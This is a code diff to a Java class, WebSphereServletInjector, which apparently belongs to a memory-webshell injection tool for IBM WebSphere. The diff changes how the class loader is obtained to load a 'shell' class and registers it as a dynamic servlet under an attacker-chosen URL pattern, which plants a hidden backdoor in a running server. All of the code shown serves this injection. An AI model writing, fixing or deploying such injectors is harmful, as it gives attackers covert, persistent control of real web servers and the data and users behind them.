@@ -70,12 +70,17 @@ public class WebSphereServletInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "loader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -94,7 +99,7 @@ public class WebSphereServletInjector {
             System.out.println("servlet already injected");
             return;
         }
-        invokeMethod(context, "addDynamicServlet", new Class[]{String.class, String.class, String.class, Properties.class}, new Object[]{getClassName(), servlet.getClass().getName(), getUrlPattern(), null});
+        invokeMethod(context, "addDynamicServlet", new Class[]{String.class, String.class, String.class, Properties.class}, new Object[]{getClassName(), getClassName(), getUrlPattern(), null});
         System.out.println("servlet injected successfully");
     }
 
